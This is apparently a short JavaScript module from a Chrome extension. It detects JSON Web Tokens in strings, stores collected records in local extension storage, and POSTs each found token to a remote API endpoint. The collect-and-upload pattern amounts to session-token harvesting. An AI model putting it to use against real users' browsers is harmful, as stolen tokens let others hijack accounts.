const JWTRe = /([A-Za-z0-9-_]{10,})\.([A-Za-z0-9-_]*)\.([A-Za-z0-9-_]*)/ // match JWT, group by section, only header mandatory

const findJWT = (candidate) => {
    try {
        const match = JWTRe.exec(candidate)
        if (match !== null) {
            JSON.parse(atob(match[1]))
            return match[0]
        }
    } catch (e) {
        console.groupCollapsed(`failed candidate sample: ${candidate.slice(0,25)} ...`)
        console.log(candidate)
        console.debug(e)
        console.groupEnd()
    }
    return null
}

const send = async (data) => {
    try {
        const rawResponse = await fetch(apiURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ jwt: data[3] })
        })
        console.debug(await rawResponse.text())
    } catch (error) {
        console.debug(error)
    }
}

const save = async (data) => {
    const stored = await chrome.storage.local.get({ 'bening': [] })
    stored['bening'].push(data)
    chrome.storage.local.set(stored)
}

export {findJWT, save, send}